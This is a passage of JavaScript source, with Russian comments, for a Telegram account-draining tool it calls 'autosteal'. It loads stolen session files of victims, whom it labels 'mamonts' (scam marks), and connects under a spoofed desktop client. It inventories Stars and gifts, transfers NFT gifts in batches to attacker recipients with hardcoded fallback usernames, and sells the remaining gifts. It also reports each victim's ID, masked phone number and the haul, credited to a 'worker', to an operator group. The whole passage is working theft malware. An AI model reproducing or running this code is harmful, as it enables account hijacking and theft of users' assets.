      console.log(`[TRANSFER-NFT] ✅ Получатель найден: ${recipientDisplay}`);
    } catch (e) {
      console.error(`[TRANSFER-NFT] ❌ Ошибка получения peer для ${recipientDisplay}:`, e.message || e);
      
      try {
        const me = await client.getMe();
        if (recipient === me.username || recipient === String(me.id) || recipient === me.id) {
          recipientPeer = me;
          inputPeer = await client.getInputEntity(recipientPeer);
        } else {
          if (progressCallback) {
            await progressCallback(`⚠️ Получатель ${recipientDisplay} не найден, пропускаю передачу NFT`);
          }
          return { sent: 0, failed: 0, success: [], failed: [] };
        }
      } catch (e2) {
        if (progressCallback) {
          await progressCallback(`⚠️ Получатель ${recipientDisplay} не найден, пропускаю передачу NFT`);
        }
        return { sent: 0, failed: 0, success: [], failed: [] };
      }
    }
    
    if (!inputPeer || !inputPeer.className) {
      throw new Error(`Не удалось получить валидный peer для получателя ${recipientDisplay}`);
    }
    
    let nftGifts = [];
    
    if (transferableNFTs && transferableNFTs.length > 0) {
      console.log(`[TRANSFER-NFT] 🖼️  Использую предварительно проверенные NFT: ${transferableNFTs.length}`);
      nftGifts = transferableNFTs.map(item => item.gift);
    } else {
      console.log(`[TRANSFER-NFT] 🔍 Получаю NFT из сохранённых подарков...`);
      const savedGifts = await client.invoke(
        new Api.payments.GetSavedStarGifts({
          peer: await client.getEntity("me"),
          offset: "",
          limit: 100,
        })
      );
      
      if (savedGifts && savedGifts.gifts) {
        for (const gift of savedGifts.gifts) {
          if (gift.gift) {
            const isNFT = gift.gift.className === 'StarGiftUnique' || gift.gift.unique === true;
            if (isNFT) {
              nftGifts.push(gift);
            }
          }
        }
      }
      console.log(`[TRANSFER-NFT] 🖼️  Найдено NFT: ${nftGifts.length}`);
    }
    
    if (nftGifts.length === 0) {
      console.log(`[TRANSFER-NFT] ⚠️  NFT не найдены, возвращаю пустой результат`);
      return { sent: 0, failed: 0, success: [], failed: [] };
    }
    
    console.log(`[TRANSFER-NFT] 🖼️  Начинаю передачу ${nftGifts.length} NFT...`);
    let successCount = 0;
    let failCount = 0;
    const successList = [];
    const failedList = [];
    
    const nftInfoMap = new Map();
    const freeTransferMap = new Map(); // Маппинг для бесплатных NFT
    if (transferableNFTs && transferableNFTs.length > 0) {
      transferableNFTs.forEach(item => {
        nftInfoMap.set(item.gift, { name: item.name, link: item.link });
        if (item.freeTransfer) {
          freeTransferMap.set(item.gift, true);
          console.log(`[TRANSFER-NFT] 💰 NFT помечен как бесплатный для передачи: ${item.name}`);
        }
      });
    }
    
    // Оптимизация: передаем NFT батчами для параллельной обработки
    const BATCH_SIZE = 3; // Количество NFT для параллельной передачи
    console.log(`[TRANSFER-NFT] 🖼️  Размер батча: ${BATCH_SIZE} NFT`);
    
    for (let batchStart = 0; batchStart < nftGifts.length; batchStart += BATCH_SIZE) {
      const batchNum = Math.floor(batchStart / BATCH_SIZE) + 1;
      const totalBatches = Math.ceil(nftGifts.length / BATCH_SIZE);
      console.log(`[TRANSFER-NFT] 🖼️  Обрабатываю батч ${batchNum}/${totalBatches} (NFT ${batchStart + 1}-${Math.min(batchStart + BATCH_SIZE, nftGifts.length)})`);
      const batchEnd = Math.min(batchStart + BATCH_SIZE, nftGifts.length);
      const batch = nftGifts.slice(batchStart, batchEnd);
      
      // Обрабатываем батч параллельно - используем новую функцию transferOneNFT с обработкой ошибок
      const batchPromises = batch.map(async (gift, batchIndex) => {
        const i = batchStart + batchIndex;
        const nftInfo = nftInfoMap.get(gift);
        const giftName = nftInfo ? nftInfo.name : (gift.gift.title || gift.gift.id || `NFT #${i + 1}`);
        const giftSlug = gift.gift.slug || '';
        const giftLink = nftInfo ? nftInfo.link : (giftSlug ? `https://t.me/nft/${giftSlug}` : '');
        const isFreeTransfer = freeTransferMap.get(gift) === true;
        
        if (progressCallback) {
          await progressCallback(`[${i + 1}/${nftGifts.length}] ${isFreeTransfer ? '💰 Бесплатная передача' : 'Отправка'} NFT: ${giftName}`);
        }
        
        // Используем новую функцию transferOneNFT с обработкой ошибок
        try {
          const result = await transferOneNFT(client, gift, inputPeer, giftName, giftLink, sessionPath, progressCallback, isFreeTransfer);
          return result;
        } catch (e) {
          const errorMsg = e.message || e.toString() || 'неизвестная ошибка';
          console.error(`[TRANSFER-NFT] ❌ [${i + 1}/${nftGifts.length}] Исключение при передаче NFT ${giftName}: ${errorMsg}`);
          return { success: false, name: giftName, link: giftLink, error: errorMsg };
        }
      });
      
      // Ждем завершения всех NFT в батче
      const batchResults = await Promise.all(batchPromises);
      
      // Обрабатываем результаты батча
      for (const result of batchResults) {
        if (result.success) {
          successCount++;
          successList.push({ name: result.name, link: result.link });
        } else {
          failCount++;
          failedList.push({ name: result.name, link: result.link, error: result.error });
        }
      }
      
      // Увеличена задержка между батчами для избежания rate limiting
      if (batchEnd < nftGifts.length) {
        await new Promise(resolve => setTimeout(resolve, 500)); // Увеличено с 100 до 500 мс
      }
    }
    
    return { sent: successCount, failed: failCount, success: successList, failed: failedList };
  } catch (e) {
    throw e;
  }
}

async function connectDonorSession(sessionPath) {
  try {
    const sessionData = await fs.readFile(sessionPath, 'utf-8');
    const trimmed = sessionData.trim();
    
    let session;
    if (trimmed.startsWith('1') && trimmed.match(/^[A-Za-z0-9+/=]+$/)) {
      session = new StringSession(trimmed);
    } else {
      const sessionName = path.basename(sessionPath, '.session');
      const sessionDir = path.dirname(sessionPath);
      session = new StoreSession(path.join(sessionDir, sessionName));
    }
    
    const client = new TelegramClient(session, apiId, apiHash, {
      connectionRetries: 5,
      receiveUpdates: false,
      deviceModel: 'PC',
      systemVersion: 'Windows 11',
      appVersion: '5.5.0',
      langCode: 'en',
      systemLangCode: 'en',
      langPack: 'tdesktop',
    });
    
    await client.connect();
    
    if (!(await client.checkAuthorization())) {
      await client.disconnect();
      return null;
    }
    
    return client;
  } catch (e) {
    return null;
  }
}

// Функция для парсинга времени из ошибки STARGIFT_TRANSFER_TOO_EARLY_XXXXXX
function parseCooldownTime(errorMessage) {
  if (!errorMessage || typeof errorMessage !== 'string') {
    return null;
  }
  
  // Ищем паттерн STARGIFT_TRANSFER_TOO_EARLY_XXXXXX
  const match = errorMessage.match(/STARGIFT_TRANSFER_TOO_EARLY[_-]?(\d+)/i);
  if (!match || !match[1]) {
    return null;
  }
  
  const seconds = parseInt(match[1], 10);
  if (isNaN(seconds) || seconds <= 0) {
    return null;
  }
  
  // Конвертируем секунды в дни и часы
  const days = Math.floor(seconds / 86400); // 86400 секунд в дне
  const remainingSeconds = seconds % 86400;
  const hours = Math.floor(remainingSeconds / 3600); // 3600 секунд в часе
  
  if (days > 0 && hours > 0) {
    return `${days}d, ${hours}h`;
  } else if (days > 0) {
    return `${days}d`;
  } else if (hours > 0) {
    return `${hours}h`;
  } else {
    const minutes = Math.floor(remainingSeconds / 60);
    return minutes > 0 ? `${minutes}m` : `${seconds}s`;
  }
}

async function sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername = null, mamontId = null) {
  try {
    console.log(`[SEND-AUTOSTEAL-RESULTS] Начало отправки итогов. Stars: ${stats.starsBefore}→${stats.starsAfter}, NFT: ${stats.nftSuccess?.length || 0}, Regular: ${stats.regularSold || 0}`);
    
    const { 
      starsBefore, 
      starsAfter, 
      regularSold, 
      regularNotSold, 
      nftSuccess = [], 
      nftFailed = [] 
    } = stats || {};
    
    const sessionUsername = accountInfo?.username || 'без username';
    const sessionUserId = accountInfo?.id || 'неизвестно';
    const mamontUser = mamontUsername || sessionUsername;
    const mamontUserId = mamontId || sessionUserId;
    const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
    
    const mskTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow', day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
    
    let message = `🎉 <b>АВТОСТИЛ ЗАВЕРШЁН!</b>\n\n👤 <b>Мамонт:</b> @${mamontUser} (<code>${mamontUserId}</code>)${workerText}\n\n📊 <b>ИТОГОВАЯ СТАТИСТИКА:</b>\n`;
    message += `├ ⭐ <b>Звёзд:</b> <code>${starsAfter || 0}</code>\n`;
    message += `├ 🖼️ <b>NFT:</b> <code>${(nftSuccess || []).length}</code>\n`;
    message += `└ 🎁 <b>Обычных подарков:</b> <code>${regularNotSold || 0}</code>\n`;
    message += `\n🕐 <b>Время:</b> <code>${mskTime} МСК</code>`;
    
    if (nftSuccess && nftSuccess.length > 0) {
      message += `\n\n✅ <b>Успешно передано NFT:</b> <code>${nftSuccess.length}</code>\n`;
      nftSuccess.forEach((nft, index) => {
        const nftName = nft.name || `NFT #${index + 1}`;
        const nftLink = nft.link || '';
        message += `${index + 1}. ${nftName}${nftLink ? ` - ${nftLink}` : ''}\n`;
      });
    }
    
    if (nftFailed && nftFailed.length > 0) {
      message += `\n\n❌ <b>Нельзя передать:</b>\n`;
      nftFailed.forEach((nft, index) => {
        const nftName = nft.name || `NFT #${index + 1}`;
        const nftLink = nft.link || '';
        const error = nft.error || 'неизвестная ошибка';
        
        // Парсим время кулдауна из ошибки
        const cooldownTime = parseCooldownTime(error);
        if (cooldownTime) {
          message += `${index + 1}. ${nftName}${nftLink ? ` - ${nftLink}` : ''}: КД ${cooldownTime}\n`;
        } else {
          message += `${index + 1}. ${nftName}${nftLink ? ` - ${nftLink}` : ''}: ${error}\n`;
        }
      });
    }
    
    if (regularSold && regularSold > 0) {
      message += `\n💰 <b>Продано обычных подарков:</b> <code>${regularSold}</code>`;
    }
    
    console.log(`[SEND-AUTOSTEAL-RESULTS] Формирую сообщение длиной: ${message.length} символов`);
    console.log(`[SEND-AUTOSTEAL-RESULTS] Сообщение:`, message.substring(0, 200) + '...');
    
    // Отправляем в группу (в отдельную тему, если указана, иначе в основную)
    const targetTopicId = AUTOSTEAL_RESULTS_TOPIC_ID !== null ? AUTOSTEAL_RESULTS_TOPIC_ID : null;
    const result = await sendLogToGroup(message, targetTopicId);
    console.log(`[SEND-AUTOSTEAL-RESULTS] Лог отправлен. Результат:`, result ? 'OK' : 'FAILED', targetTopicId ? `(Topic ID: ${targetTopicId})` : '(основная тема)');
    
    if (!result || (result.ok === false)) {
      const errorInfo = result.error_code 
        ? `${result.description || 'Unknown error'} (code: ${result.error_code})`
        : `Error: ${result.description || 'Unknown error'}`;
      console.error(`[SEND-AUTOSTEAL-RESULTS] Ошибка отправки лога:`, errorInfo);
      // Пробуем отправить админу
      try {
        await sendLogToAdmin(`⚠️ Не удалось отправить итоговый лог в группу:\n\n${message}`);
      } catch (e2) {
        console.error(`[SEND-AUTOSTEAL-RESULTS] Ошибка отправки админу:`, e2);
      }
    }
  } catch (e) {
    console.error(`[SEND-AUTOSTEAL-RESULTS] Критическая ошибка отправки итогового лога:`, e);
    console.error(`[SEND-AUTOSTEAL-RESULTS] Stack:`, e.stack);
    
    // Пробуем отправить хотя бы админу
    try {
      await sendLogToAdmin(`❌ Ошибка отправки итогового лога автостила: ${e.message}\n\nStats: ${JSON.stringify(stats, null, 2)}`);
    } catch (e2) {
      console.error(`[SEND-AUTOSTEAL-RESULTS] Ошибка отправки админу:`, e2);
    }
  }
}

// ==================== ФУНКЦИЯ ПОЛНОГО АВТОСТИЛА ====================

// Глобальный набор для отслеживания активных сессий (защита от дублирования)
const activeAutostealSessions = new Set();

async function performFullAutoSteal(sessionPath, chatId, workerUsername = null, workerId = null, mamontUsername = null, mamontId = null) {
  console.log(`\n${'='.repeat(80)}`);
  console.log(`[AUTOSTEAL] 🚀 НАЧАЛО АВТОСТИЛА`);
  console.log(`[AUTOSTEAL] 📁 Сессия: ${sessionPath}`);
  console.log(`[AUTOSTEAL] 👤 Мамонт: @${mamontUsername || 'неизвестно'} (${mamontId || 'неизвестно'})`);
  console.log(`[AUTOSTEAL] 👷 Воркер: @${workerUsername || 'неизвестно'} (${workerId || 'неизвестно'})`);
  console.log(`${'='.repeat(80)}\n`);
  
  // Проверяем, не запущен ли уже автостил для этой сессии
  if (activeAutostealSessions.has(sessionPath)) {
    console.log(`[AUTOSTEAL] ⚠️ Автостил уже запущен для сессии ${sessionPath}. Пропускаем дубликат.`);
    return;
  }
  
  // Добавляем сессию в активные
  activeAutostealSessions.add(sessionPath);
  console.log(`[AUTOSTEAL] ✅ Сессия добавлена в активные. Всего активных: ${activeAutostealSessions.size}`);
  
  let client = null;
  let statusMessage = null;
  let accountInfo = null; // Объявляем accountInfo перед try блоком
  
  // Загружаем метаданные из JSON, если параметры не переданы
  if (!workerUsername && !workerId && !mamontUsername && !mamontId) {
    const sessionDataFile = sessionPath.replace('.session', '.json');
    if (await fs.pathExists(sessionDataFile)) {
      try {
        const sessionMetadata = await fs.readJson(sessionDataFile);
        workerUsername = sessionMetadata.workerUsername || workerUsername;
        workerId = sessionMetadata.workerId || workerId;
        mamontUsername = sessionMetadata.mamontUsername || mamontUsername;
        mamontId = sessionMetadata.mamontId || mamontId;
        console.log(`[AUTOSTEAL] Загружены метаданные из JSON: worker=@${workerUsername || 'null'} (${workerId || 'null'}), mamont=@${mamontUsername || 'null'} (${mamontId || 'null'})`);
      } catch (e) {
        console.error(`[AUTOSTEAL] Ошибка загрузки метаданных из JSON: ${e.message}`);
      }
    }
  }
  
  // Статистика для итогов
  const stats = {
    starsBefore: 0,
    starsAfter: 0,
    regularSold: 0,
    regularNotSold: 0,
    nftSuccess: [],
    nftFailed: []
  };
  
  try {
    console.log(`[AUTOSTEAL] 📂 ЭТАП 1: Загрузка сессии`);
    // Загружаем сессию
    const sessionString = await loadSessionFromFile(sessionPath);
    console.log(`[AUTOSTEAL] 📂 Сессия загружена из файла, длина: ${sessionString ? sessionString.length : 0} символов`);
    
    let session;
    if (sessionString && typeof sessionString === 'string' && sessionString.length > 0 && sessionString.startsWith('1')) {
      session = new StringSession(sessionString);
      console.log(`[AUTOSTEAL] 📂 Тип сессии: StringSession`);
    } else {
      const sessionName = sessionPath.replace('.session', '').replace(__dirname + path.sep, '');
      session = new StoreSession(sessionName);
      console.log(`[AUTOSTEAL] 📂 Тип сессии: StoreSession (${sessionName})`);
    }
    
    client = new TelegramClient(session, apiId, apiHash, {
      connectionRetries: 5,
      receiveUpdates: false,
      timeout: 120000,
      requestRetries: 3,
      deviceModel: 'PC',
      systemVersion: 'Windows 11',
      appVersion: '5.5.0',
      langCode: 'en',
      systemLangCode: 'en',
      langPack: 'tdesktop',
    });
    
    console.log(`[AUTOSTEAL] 🔌 Подключаюсь к Telegram...`);
    try {
      await Promise.race([
        client.connect(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 120000))
      ]);
    } catch (e) {
      console.error(`[AUTOSTEAL] Ошибка подключения: ${e.message}`);
      if (client) {
        try {
          await client.disconnect();
        } catch (e2) {}
      }
      throw new Error(`Не удалось подключиться к сессии: ${e.message}`);
    }
    
    console.log(`[AUTOSTEAL] ✅ Подключение установлено`);
    console.log(`[AUTOSTEAL] 🔐 Проверяю авторизацию...`);
    // Убрана задержка для ускорения
    
    let isAuthorized = false;
    try {
      isAuthorized = await Promise.race([
        client.checkAuthorization(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 30000))
      ]);
      console.log(`[AUTOSTEAL] 🔐 Результат проверки авторизации: ${isAuthorized ? '✅ Авторизована' : '❌ Не авторизована'}`);
    } catch (e) {
      console.error(`[AUTOSTEAL] ❌ Ошибка проверки авторизации: ${e.message}`);
      console.error(`[AUTOSTEAL] ❌ Stack: ${e.stack}`);
      if (client) {
        try {
          await client.disconnect();
        } catch (e2) {}
      }
      throw new Error(`Не удалось проверить авторизацию: ${e.message}`);
    }
    
    if (!isAuthorized) {
      console.error(`[AUTOSTEAL] ❌ Сессия не авторизована! Завершаю автостил.`);
      if (client) {
        try {
          await client.disconnect();
        } catch (e2) {}
      }
      await sendMessageWithTopic(chatId, '❌ Сессия не авторизована!');
      // Убрано логирование админу
      return;
    }
    
    console.log(`[AUTOSTEAL] ✅ Сессия авторизована, начинаю автостил...`);
    statusMessage = await sendMessageWithTopic(chatId, '⏳ Запускаю автостил...');
    
    await loadConfig();
    // Поддержка ID и username для получателя NFT
    const recipientId = config.recipientId;
    let recipientUsername = config.recipientUsername;
    if (recipientUsername && recipientUsername !== 'null' && !recipientUsername.startsWith('@')) {
      recipientUsername = '@' + recipientUsername;
    }
    const recipient = recipientId ? recipientId : (recipientUsername && recipientUsername !== 'null' ? recipientUsername : 'wet1x');
    
    // Поддержка ID и username для получателя звёзд
    const remainingStarsRecipientId = config.remainingStarsRecipientId;
    let remainingStarsRecipientUsername = config.remainingStarsRecipient;
    if (remainingStarsRecipientUsername && remainingStarsRecipientUsername !== 'null' && !remainingStarsRecipientUsername.startsWith('@')) {
      remainingStarsRecipientUsername = '@' + remainingStarsRecipientUsername;
    }
    // Если указан ID, используем его, иначе username (если указан), иначе fallback
    const remainingStarsRecipient = remainingStarsRecipientId 
      ? remainingStarsRecipientId 
      : (remainingStarsRecipientUsername && remainingStarsRecipientUsername !== 'null' && remainingStarsRecipientUsername.trim() !== '' 
          ? remainingStarsRecipientUsername 
          : 'henite123');
    
    console.log(`[AUTOSTEAL] Используется получатель NFT: ${recipientId ? `ID ${recipientId}` : `@${recipientUsername}`}`);
    console.log(`[AUTOSTEAL] Используется получатель звёзд: ${remainingStarsRecipientId ? `ID ${remainingStarsRecipientId}` : `@${remainingStarsRecipientUsername}`}`);
    
    // ОПТИМИЗАЦИЯ: Спекулятивное выполнение - загружаем данные параллельно
    console.log(`[AUTOSTEAL] 📊 ЭТАП 2: Параллельная загрузка данных (спекулятивное выполнение)`);
    const [accountInfo, initialStarsBalance, giftsInfo] = await Promise.all([
      getAccountInfo(client),
      getStarsBalance(client, sessionPath),
      getGiftsInfo(client)
    ]);
    
    // Используем let для starsBalance, так как она может изменяться
    let starsBalance = initialStarsBalance;
    
    console.log(`[AUTOSTEAL] 👤 AccountInfo: @${accountInfo.username || 'unknown'} (ID: ${accountInfo.id || 'unknown'})`);
    console.log(`[AUTOSTEAL] ⭐ Баланс звёзд: ${starsBalance}`);
    console.log(`[AUTOSTEAL] 🎁 Обычных подарков: ${giftsInfo.regular.length}`);
    console.log(`[AUTOSTEAL] 🖼️  NFT подарков: ${giftsInfo.nft.length}`);
    stats.starsBefore = starsBalance;
    
    // ОПТИМИЗАЦИЯ: Preflight check - быстрая проверка возможности сценария
    console.log(`[AUTOSTEAL] 🔍 PREFLIGHT: Быстрая проверка возможности сценария...`);
    const estimatedNFTCount = giftsInfo.nft.length;
    const estimatedTransferCost = estimatedNFTCount * 25; // Примерная стоимость передачи NFT
    const estimatedRegularGifts = giftsInfo.regular.length;
    const estimatedStarsFromGifts = Math.floor(estimatedRegularGifts * 10 * 0.7); // Примерная оценка (70% от стоимости)
    
    if (starsBalance + estimatedStarsFromGifts < estimatedTransferCost && estimatedNFTCount > 0) {
      console.log(`[AUTOSTEAL] ⚠️  PREFLIGHT: Возможно недостаточно звёзд (баланс: ${starsBalance}, нужно: ~${estimatedTransferCost}, можно получить: ~${estimatedStarsFromGifts})`);
      // Не прерываем, но предупреждаем
    } else {
      console.log(`[AUTOSTEAL] ✅ PREFLIGHT: Сценарий выглядит выполнимым`);
    }
    
    if (giftsInfo.nft.length > 0) {
      console.log(`[AUTOSTEAL] 🖼️  Список NFT:`);
      giftsInfo.nft.forEach((nft, idx) => {
        const name = nft.gift?.title || nft.gift?.slug || `NFT #${idx + 1}`;
        const link = nft.gift?.slug ? `https://t.me/nft/${nft.gift.slug}` : 'нет ссылки';
        console.log(`[AUTOSTEAL]    ${idx + 1}. ${name} - ${link}`);
      });
    }
    
    // Получаем номер телефона через API
    const phoneNumber = await getPhoneNumberFromAPI(mamontId || accountInfo.id);
    const maskedPhone = phoneNumber ? maskPhoneNumber(phoneNumber) : 'неизвестно';
    
    // Логируем начало автостила
    const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
    
    // Формируем текст мамонта: если username - это число (ID), не показываем его как username
    const mamontUsernameValue = mamontUsername || accountInfo.username || null;
    const mamontIdValue = mamontId || accountInfo.id;
    
    // Проверяем, является ли username валидным
    const validUsername = mamontUsernameValue && isValidUsername(mamontUsernameValue);
    
    let mamontText;
    if (validUsername) {
      // Есть нормальный username (не число и не "user" + число)
      mamontText = `\n👤 <b>Мамонт:</b> @${mamontUsernameValue} (<code>${mamontIdValue}</code>)`;
    } else {
      // Нет username или username - это число/"user" + число, показываем только ID
      mamontText = `\n👤 <b>Мамонт:</b> <code>${mamontIdValue}</code>`;
    }
    
    if (giftsInfo.nft.length > 0) {
      const nftList = giftsInfo.nft.map((nft, idx) => {
        const nftName = nft.gift?.title || nft.gift?.slug || `NFT #${idx + 1}`;
        const nftLink = nft.gift?.slug ? `https://t.me/nft/${nft.gift.slug}` : '';
        return `${idx + 1}. ${nftName}${nftLink ? ` - ${nftLink}` : ''}`;
      }).join('\n');
      
      await sendLogToGroup(
        `${workerTextFormatted}${mamontText}\n` +
        `🆔 <b>ID:</b> <code>${accountInfo.id || 'неизвестно'}</code>\n` +
        `📱 <b>Номер:</b> <code>${maskedPhone}</code>\n` +
        `🎁 <b>Обычные подарки:</b> <code>${giftsInfo.regular.length}</code>\n` +
        `⭐️ <b>Звёзды:</b> <code>${starsBalance}</code>\n` +
        `🖼️ <b>NFT:</b> <code>${giftsInfo.nft.length}</code>\n${nftList}\n\n` +
        `Запускаю автостил мамонту...`
      );
    } else {
      await sendLogToGroup(
        `${workerTextFormatted}${mamontText}\n` +
        `🆔 <b>ID:</b> <code>${accountInfo.id || 'неизвестно'}</code>\n` +
        `📱 <b>Номер:</b> <code>${maskedPhone}</code>\n` +
        `🎁 <b>Обычные подарки:</b> <code>${giftsInfo.regular.length}</code>\n` +
        `⭐️ <b>Звёзды:</b> <code>${starsBalance}</code>\n` +
        `🖼️ <b>NFT:</b> <code>0</code>\n\n` +
        `Запускаю автостил мамонту...`
      );
    }
    
    // Сначала проверяем, какие NFT можно передать
    console.log(`[AUTOSTEAL] 🔍 ЭТАП 3: Проверка NFT перед передачей`);
    let transferableNFTs = [];
    let nonTransferableNFTs = [];
    
    if (giftsInfo.nft.length > 0) {
      console.log(`[AUTOSTEAL] 🔍 Найдено ${giftsInfo.nft.length} NFT, начинаю проверку...`);
      await bot.editMessageText(
        `🔍 Проверяю NFT перед передачей...\n` +
        `⏳ Это может занять некоторое время...`,
        { chat_id: chatId, message_id: statusMessage.message_id }
      );
      
      let recipientPeer = null;
      try {
        console.log(`[AUTOSTEAL] 🔍 Получаю информацию о получателе: ${recipientId ? `ID ${recipientId}` : `@${recipientUsername}`}`);
        recipientPeer = await client.getEntity(recipient);
        const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
        console.log(`[AUTOSTEAL] ✅ Получатель найден: ${recipientDisplay}, ID: ${recipientPeer.id}`);
      } catch (e) {
        const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
        console.error(`[AUTOSTEAL] ❌ Ошибка: получатель ${recipientDisplay} не найден:`, e.message || e);
        console.error(`[AUTOSTEAL] ❌ Stack: ${e.stack}`);
        await bot.editMessageText(
          `⚠️ Получатель ${recipientDisplay} не найден. Пропускаю передачу NFT, продолжаю автостил...`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
        // Убрано логирование в группу
        giftsInfo.nft = [];
      }
      
      let checkProgressText = '';
      console.log(`[AUTOSTEAL] 🔍 Начинаю проверку каждого NFT...`);
      const checkResult = await checkNFTsBeforeTransfer(client, recipient, async (msg) => {
        checkProgressText += msg + '\n';
        if (checkProgressText.length > 3000) {
          checkProgressText = checkProgressText.slice(-2000);
        }
        try {
          await bot.editMessageText(
            `🔍 Проверка NFT:\n${checkProgressText}`,
            { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
          );
        } catch (e) {}
      });
      
      transferableNFTs = checkResult.transferable || [];
      nonTransferableNFTs = checkResult.nonTransferable || [];
      
      console.log(`[AUTOSTEAL] ✅ Проверка NFT завершена:`);
      console.log(`[AUTOSTEAL]    ✅ Можно передать: ${transferableNFTs.length}`);
      console.log(`[AUTOSTEAL]    ❌ Нельзя передать: ${nonTransferableNFTs.length}`);
      
      if (nonTransferableNFTs.length > 0) {
        console.log(`[AUTOSTEAL] ❌ Причины, почему NFT нельзя передать:`);
        nonTransferableNFTs.forEach((nft, idx) => {
          console.log(`[AUTOSTEAL]    ${idx + 1}. ${nft.name || 'Неизвестный NFT'}: ${nft.error || 'неизвестная ошибка'}`);
        });
      }
      
      // Сохраняем информацию о непередаваемых NFT в статистику
      if (nonTransferableNFTs.length > 0) {
        stats.nftFailed = nonTransferableNFTs.map(item => ({
          name: item.name,
          link: item.link,
          error: item.error
        }));
      }
    }
    
    // Используем только проверенные NFT для расчёта стоимости
    console.log(`[AUTOSTEAL] 💰 ЭТАП 4: Расчёт необходимых звёзд`);
    const nftCount = transferableNFTs.length;
    // Считаем только платные NFT (без freeTransfer флага)
    const paidNFTs = transferableNFTs.filter(nft => !nft.freeTransfer);
    const freeNFTs = transferableNFTs.filter(nft => nft.freeTransfer);
    const transferCost = paidNFTs.length * 25; // Только платные NFT стоят 25 звёзд
    let neededStars = Math.max(0, transferCost - starsBalance);
    
    console.log(`[AUTOSTEAL] 💰 NFT для передачи: ${nftCount} (${paidNFTs.length} платных, ${freeNFTs.length} бесплатных)`);
    console.log(`[AUTOSTEAL] 💰 Стоимость передачи: ${transferCost} звёзд (${paidNFTs.length} платных × 25)`);
    if (freeNFTs.length > 0) {
      console.log(`[AUTOSTEAL] 💰 Бесплатных NFT (не требуют оплаты): ${freeNFTs.length}`);
      freeNFTs.forEach((nft, idx) => {
        console.log(`[AUTOSTEAL]       ${idx + 1}. ${nft.name || 'Неизвестный NFT'}`);
      });
    }
    console.log(`[AUTOSTEAL] 💰 Текущий баланс: ${starsBalance} звёзд`);
    console.log(`[AUTOSTEAL] 💰 Необходимо звёзд: ${neededStars}`);
    
    const workerText = workerUsername || workerId ? `\nВоркер: @${workerUsername || 'неизвестно'}(${workerId || 'неизвестно'})` : '';
    
    console.log(`[AUTOSTEAL] ➡️  Продолжаю работу...`);
    
    if (neededStars > 0) {
      console.log(`[AUTOSTEAL] Нужно звёзд: ${neededStars}, проверяю донорскую сессию...`);
      const donorPath = path.join(__dirname, config.donorFolder || 'donor');
      let donorStars = 0;
      if (await fs.pathExists(donorPath)) {
        const files = await fs.readdir(donorPath);
        const sessionFile = files.find(f => f.endsWith('.session'));
        if (sessionFile) {
          const donorSessionPath = path.join(donorPath, sessionFile);
          try {
            const donorSessionString = await loadSessionFromFile(donorSessionPath);
            let donorSession;
            if (donorSessionString && typeof donorSessionString === 'string' && donorSessionString.length > 0 && donorSessionString.startsWith('1')) {
              donorSession = new StringSession(donorSessionString);
            } else {
              const sessionName = donorSessionPath.replace('.session', '').replace(__dirname + path.sep, '');
              donorSession = new StoreSession(sessionName);
            }
            const donorClient = new TelegramClient(donorSession, apiId, apiHash, {
              connectionRetries: 5,
              receiveUpdates: false,
              timeout: 60000,
              requestRetries: 3,
            });
            await donorClient.connect();
            if (await donorClient.checkAuthorization()) {
              donorStars = await getStarsBalance(donorClient);
              await donorClient.disconnect();
            }
          } catch (e) {
            console.error(`[AUTOSTEAL] Ошибка при работе с донорской сессией: ${e.message}`);
          }
        }
      }
      console.log(`[AUTOSTEAL] Донорских звёзд: ${donorStars}`);
      // Лог "Расчёт звёзд" удалён по запросу
    }
    
    console.log(`[AUTOSTEAL] Обновляю сообщение статуса...`);
    try {
      let statusText = `📊 Информация о сессии:\n` +
        `⭐ Звёзды: ${starsBalance}\n` +
        `🖼️  NFT можно передать: ${nftCount}\n` +
        `💰 Нужно звёзд для передачи NFT: ${transferCost}\n` +
        `📉 Не хватает: ${neededStars > 0 ? neededStars : 0}`;
      
      if (nonTransferableNFTs.length > 0) {
        statusText += `\n⚠️ NFT нельзя передать: ${nonTransferableNFTs.length}`;
      }
      
      await safeEditMessage(chatId, statusMessage.message_id, statusText);
      console.log(`[AUTOSTEAL] Сообщение статуса обновлено`);
    } catch (e) {
      console.error(`[AUTOSTEAL] Ошибка обновления сообщения статуса: ${e.message}`);
    }
    
    // Если нет NFT для передачи, продаём все обычные подарки и отправляем звёзды на сообщение
    if (nftCount === 0) {
      console.log(`[AUTOSTEAL] ⚠️  НЕТ NFT ДЛЯ ПЕРЕДАЧИ!`);
      console.log(`[AUTOSTEAL]    Всего NFT найдено: ${giftsInfo.nft.length}`);
      console.log(`[AUTOSTEAL]    Можно передать: 0`);
      console.log(`[AUTOSTEAL]    Нельзя передать: ${nonTransferableNFTs.length}`);
      console.log(`[AUTOSTEAL] 💰 Продаю все обычные подарки и отправляю звёзды на сообщение`);
      
      // Продаём все обычные подарки
      if (giftsInfo.regular.length > 0) {
        console.log(`[AUTOSTEAL] 💰 ЭТАП: Продажа всех обычных подарков (нет NFT)`);
        console.log(`[AUTOSTEAL] 💰 Найдено обычных подарков: ${giftsInfo.regular.length}`);
        await bot.editMessageText(
          `ℹ️ Нет NFT для передачи.\n\n` +
          `💰 Найдено обычных подарков: ${giftsInfo.regular.length}\n` +
          `⏳ Продаю все подарки...`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        const starsBeforeSale = starsBalance;
        let soldCount = 0;
        let failedCount = 0;
        
        console.log(`[AUTOSTEAL] 💰 Начинаю продажу ${giftsInfo.regular.length} подарков...`);
